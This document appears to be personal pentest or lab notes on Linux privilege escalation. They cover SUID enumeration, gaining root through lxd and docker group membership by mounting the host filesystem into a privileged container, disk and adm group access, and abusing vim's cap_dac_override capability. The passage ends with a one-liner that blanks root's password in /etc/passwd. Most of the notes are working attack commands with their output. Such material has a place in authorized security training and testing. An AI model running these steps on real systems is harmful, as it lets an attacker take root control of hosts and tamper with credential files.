
Find Root SUI : 
```sh
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
#and
find / -uid 0 -perm -6000 -type f 2>/dev/null
```


**Privileged Groups: LXC / LXD Exploitation**

1. **Group Membership:**
   - User `devops` is a member of groups `devops` and `lxd`.
   - Command: 
     ```sh
     id
     ```
   - Output: `uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)`

2. **Unzipping Alpine Image:**
   - Command: 
     ```sh
     unzip alpine.zip
     ```
   - Output: Archive extraction details.

3. **LXD Initialization:**
   - Command: 
     ```sh
     lxd init
     ```
   - Prompts:
     - Configure new storage pool? (yes)
     - Storage backend (dir)
     - LXD over the network? (no)
     - Configure LXD bridge? (yes)

   - Error: `/usr/sbin/dpkg-reconfigure` must be run as root.

4. **Import Local Image:**
   - Command: 
     ```sh
     lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
     ```
   - Output: Image imported with fingerprint `be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b`

5. **Start Privileged Container:**
   - Command: 
     ```sh
     lxc init alpine r00t -c security.privileged=true
     ```
   - Output: Container `r00t` created.

6. **Mount Host File System:**
   - Command: 
     ```sh
     lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
     ```
   - Output: Device `mydev` added to `r00t`.

7. **Spawn Shell Inside Container:**
   - Commands:
 ```sh
lxc start r00t
 ```
       
```sh
lxc exec r00t /bin/sh
```
   - Output: Access inside the container with root privileges.

8. **Docker Group Exploitation:**
   - Members in the docker group have root-level access.
   - Example Docker command: 
```sh
     docker run -v /root:/mnt -it ubuntu
```

9. **Disk Group Access:**
   - Users in the disk group have full access to devices in `/dev`, like `/dev/sda1`.
   - Example: Use `debugfs` to access the entire file system with root privileges.

10. **ADM Group Access:**
    - Members in the adm group can read all logs in `/var/log`.
    - User `secaudit` is a member of groups `secaudit` and `adm`.

Enumerate Capabilities : 

```sh
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

Exploiting  Capabilities: 
```sh
getcap /usr/bin/vim.basic
```

We can use the `cap_dac_override` capability of the `/usr/bin/vim` binary to modify a system file:

```sh
/usr/bin/vim.basic /etc/passwd
```

We also can make these changes in a non-interactive mode:

```sh
echo -e ':%s/^root:[^:]*:/root::/\nwq' | /usr/bin/vim.basic -es /etc/passwd
cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```

 